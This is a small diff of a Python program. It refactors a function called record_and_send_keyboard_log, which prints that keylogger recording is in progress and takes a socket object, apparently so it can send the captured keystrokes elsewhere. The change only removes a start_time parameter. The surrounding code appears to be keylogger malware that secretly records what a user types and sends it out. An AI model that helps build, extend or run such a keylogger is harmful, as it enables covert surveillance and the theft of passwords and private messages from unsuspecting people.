@@ -67,10 +67,10 @@ def save_wave_file(file_io, audio_data):
         wave_file.writeframes(audio_data)
 
 
-def record_and_send_keyboard_log(duration=10, sio=None, start_time=None):
+def record_and_send_keyboard_log(duration=10, sio=None):
     try:
         print("Enregistrement du keylogger en cours...")
-        start_time = time.time() if start_time is None else start_time
+        start_time = time.time()
         keyboard_log = []
 
         while time.time() - start_time < duration:
